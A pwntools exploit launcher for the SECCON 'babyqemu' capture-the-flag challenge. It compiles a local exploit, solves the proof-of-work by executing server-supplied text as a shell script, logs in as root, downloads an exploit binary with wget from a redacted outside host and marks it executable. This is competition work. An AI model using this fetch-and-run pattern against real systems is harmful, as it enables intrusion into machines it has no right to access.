#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "babyqemu.seccon.games"
PORT = 3824

START_SCRIPT = "./run.sh"
REMOTE_SCRIPT = START_SCRIPT

PROMPT = b"# "
PKGSIZE = 300


def compile():
    log.info("Compile")
    res = os.system("musl-gcc -w -s -static -o3 pwn.c -o pwn -masm=intel")

    return res == 0


def exec_cmd(cmd):
    r.sendline(cmd)
    r.recvuntil(PROMPT)


def exploit(r):
    if not LOCAL:
        pow = r.recvline()

        with open("pow.sh", "wb") as f:
            f.write(b"#!/bin/sh\n")
            f.write(pow)
        os.system("chmod +x pow.sh")
        p = process("./pow.sh")
        p.recvuntil(b": ")
        sol = p.recvline()
        r.sendline(sol)

    r.sendlineafter(b"login: ", b"root")
    r.recvuntil(b"# ")

    exec_cmd(b"wget http://{REDACTED}/pwn")
    exec_cmd(b"chmod +x pwn")

    r.interactive()

    return


if __name__ == "__main__":
    if not compile():
        exit()

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
        exploit(r)
    else:
        LOCAL = True
        r = process(START_SCRIPT)
        print(util.proc.pidof(r))
        pause()
        exploit(r)
